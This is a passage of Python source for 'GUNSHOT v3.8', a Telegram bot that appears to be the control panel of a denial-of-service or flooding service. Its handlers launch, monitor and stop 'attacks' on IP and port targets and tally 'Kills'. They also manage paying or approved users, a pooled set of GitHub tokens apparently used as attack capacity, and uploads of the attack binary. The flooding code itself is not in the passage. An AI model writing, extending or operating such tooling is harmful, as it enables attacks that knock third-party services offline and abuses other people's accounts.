    elif data in ("status", "refresh_status"):
        if not can_attack(user_id):
            await send("⛔ Access Denied"); return
        if not active_attacks:
            text = "<b>📡 STANDBY</b>\n\nStatus: 🟢 IDLE"
        else:
            text = f"<b>📡 ACTIVE ({len(active_attacks)})</b>\n\n"
            for i, (aid, d) in enumerate(active_attacks.items(), 1):
                el = int(time.time() - d['start_time'])
                bar = progress_bar(el, d['time'])
                text += f"{i}. <code>[{bar}]</code> {el}s/{d['time']}s\n   <code>{d['ip']}:{d['port']}</code>\n\n"
        kb = [
            [InlineKeyboardButton("🔄 Refresh", callback_data="refresh_status")],
            [InlineKeyboardButton("🛑 Stop All", callback_data="stop")],
            [InlineKeyboardButton("🔙 Back", callback_data="back_start")]
        ]
        await send(text, InlineKeyboardMarkup(kb))

    elif data == "stop":
        if not can_attack(user_id):
            await send("⛔"); return
        if not active_attacks:
            msg = "✅ No active."
        else:
            n = len(active_attacks)
            for aid in list(active_attacks.keys()):
                finish_attack(aid)
            msg = f"🛑 Terminated {n}."
        kb = [[InlineKeyboardButton("🔙 Back", callback_data="back_start")]]
        await send(msg, InlineKeyboardMarkup(kb))

    elif data == "help_menu":
        kb = [[InlineKeyboardButton("🔙 Back", callback_data="back_start")]]
        await send("<b>🔫 Use /help for full list.</b>", InlineKeyboardMarkup(kb))

    elif data == "about_menu":
        kb = [[InlineKeyboardButton("🔙 Back", callback_data="back_start")]]
        await send("<b>🔫 GUNSHOT v3.8</b>\nHosted on Railway", InlineKeyboardMarkup(kb))

    elif data == "back_start":
        username = query.from_user.username or "NoUsername"
        total = sum(attack_counters.values())
        mine = attack_counters.get(str(user_id), 0)
        if can_attack(user_id):
            role = "👑 OWNER" if is_owner(user_id) else "✅ APPROVED"
            kb = [
                [InlineKeyboardButton("🚀 Launch", callback_data="attack_help")],
                [InlineKeyboardButton("📡 Status", callback_data="status")],
                [InlineKeyboardButton("🛑 Abort", callback_data="stop")],
            ]
            if is_owner(user_id):
                kb.append([InlineKeyboardButton("⚙️ Admin", callback_data="admin_panel")])
            kb.append([InlineKeyboardButton("❓ Help", callback_data="help_menu")])
            kb.append([InlineKeyboardButton("ℹ️ About", callback_data="about_menu")])
            text = (
                f"<b>🔫 GUNSHOT v3.8</b>\n\n"
                f"👤 @{username}\n👑 {role}\n🔄 Tokens: {len(github_tokens)}\n"
                f"💥 Kills: {mine}\n🌐 Global: {total}"
            )
            await send(text, InlineKeyboardMarkup(kb))
        else:
            await send("⛔ Access Denied.")

    elif data in ("admin_panel", "back_admin"):
        if not is_owner(user_id):
            await send("⛔"); return
        kb = [
            [InlineKeyboardButton("🔑 Tokens", callback_data="admin_tokens")],
            [InlineKeyboardButton("👤 Per User", callback_data="admin_usertokens")],
            [InlineKeyboardButton("👥 Users", callback_data="admin_users")],
            [InlineKeyboardButton("⏳ Pending", callback_data="admin_pending")],
            [InlineKeyboardButton("📤 Binary", callback_data="admin_binary")],
            [InlineKeyboardButton("🧹 Health", callback_data="admin_checktokens")],
            [InlineKeyboardButton("🔙 Main", callback_data="back_start")]
        ]
        await send("⚙️ <b>Admin Console</b>", InlineKeyboardMarkup(kb))

    elif data == "admin_tokens" and is_owner(user_id):
        removed = auto_remove_expired()
        if not github_tokens:
            msg = "📭 Empty."
        else:
            msg = "<b>🔐 TOKENS</b>\n\n"
            for i, t in enumerate(github_tokens, 1):
                msg += f"{i}. @{t.get('username','?')} – <code>{t['token'][:10]}…</code>\n"
            msg += f"\nTotal: {len(github_tokens)}"
            if removed:
                msg += f"\n🧹 {removed} removed"
        kb = [[InlineKeyboardButton("🔙 Admin", callback_data="back_admin")]]
        await send(msg, InlineKeyboardMarkup(kb))

    elif data == "admin_users" and is_owner(user_id):
        if not approved_users:
            msg = "📭 None."
        else:
            msg = "<b>👥</b>\n\n"
            for uid, d in approved_users.items():
                msg += f"<code>{uid}</code> – {d.get('days','?')}d – 💥{attack_counters.get(uid,0)}\n"
        kb = [[InlineKeyboardButton("🔙 Admin", callback_data="back_admin")]]
        await send(msg, InlineKeyboardMarkup(kb))

    elif data == "admin_pending" and is_owner(user_id):
        if not pending_users:
            msg = "📭 None."
        else:
            msg = "<b>⏳</b>\n\n"
            for u in pending_users:
                msg += f"<code>{u.get('user_id')}</code> @{u.get('username')}\n"
        kb = [[InlineKeyboardButton("🔙 Admin", callback_data="back_admin")]]
        await send(msg, InlineKeyboardMarkup(kb))

    elif data == "admin_binary" and is_owner(user_id):
        kb = [[InlineKeyboardButton("🔙 Admin", callback_data="back_admin")]]
        await send("📤 Use <code>/binary_upload</code>", InlineKeyboardMarkup(kb))

    elif data == "admin_usertokens" and is_owner(user_id):
        groups = {}
        for t in github_tokens:
            groups.setdefault(t.get('added_by', '?'), []).append(t)
        if not groups:
            msg = "📭 None."
        else:
            msg = "<b>📊 PER USER</b>\n\n"
            for uid, ts in groups.items():
                msg += f"<code>{uid}</code>: {len(ts)}\n"
        kb = [[InlineKeyboardButton("🔙 Admin", callback_data="back_admin")]]
        await send(msg, InlineKeyboardMarkup(kb))

    elif data == "admin_checktokens" and is_owner(user_id):
        removed = auto_remove_expired()
        msg = f"<b>🔍 HEALTH</b>\n\nTotal: {len(github_tokens)}\nRemoved: {removed}"
        kb = [[InlineKeyboardButton("🔙 Admin", callback_data="back_admin")]]
        await send(msg, InlineKeyboardMarkup(kb))

    else:
        await send("❓ Unknown.")

# ============================================================
# ===== ERROR HANDLER =====
# ============================================================

async def error_handler(update, context):
    logger.error(f"Error: {context.error}")
    logger.error(traceback.format_exc())
    if update and update.effective_message:
        try:
            await update.effective_message.reply_text("⚠️ Error. Check logs.", parse_mode='HTML')
        except:
            pass

# ============================================================
# ===== MAIN =====
# ============================================================

def main():
    try:
        app = Application.builder().token(BOT_TOKEN).build()

        conv = ConversationHandler(
            entry_points=[CommandHandler("binary_upload", binary_upload_start)],
            states={
                WAITING_FOR_BINARY: [
                    MessageHandler(filters.Document.ALL, binary_upload_receive),
                    CommandHandler("cancel", binary_upload_cancel)
                ]
            },
            fallbacks=[CommandHandler("cancel", binary_upload_cancel)]
        )
        app.add_handler(conv)

        for cmd, fn in [
            ("start", start_cmd), ("attack", attack_cmd), ("status", status_cmd),
            ("stop", stop_cmd), ("help", help_cmd), ("myid", myid_cmd), ("about", about_cmd),
            ("addtoken", addtoken_cmd), ("mytokens", mytokens_cmd), ("removetoken", removetoken_cmd),
            ("tokens", tokens_cmd), ("usertokens", usertokens_cmd), ("cleartokens", cleartokens_cmd),
            ("checktokens", checktokens_cmd), ("approve", approve_cmd), ("remove", removeuser_cmd),
            ("users", users_cmd), ("pending", pending_cmd), ("broadcast", broadcast_cmd),
            ("maintenance", maintenance_cmd),
        ]:
            app.add_handler(CommandHandler(cmd, fn))

        app.add_handler(CallbackQueryHandler(button_callback))
        app.add_error_handler(error_handler)

        logger.info("🔫 GUNSHOT v3.8 started!")
        logger.info(f"🔄 Tokens loaded: {len(github_tokens)}")
        app.run_polling(allowed_updates=Update.ALL_TYPES, drop_pending_updates=True)
    except Exception as e:
        logger.error(f"Main error: {e}")
        traceback.print_exc()

if __name__ == "__main__":
    main()
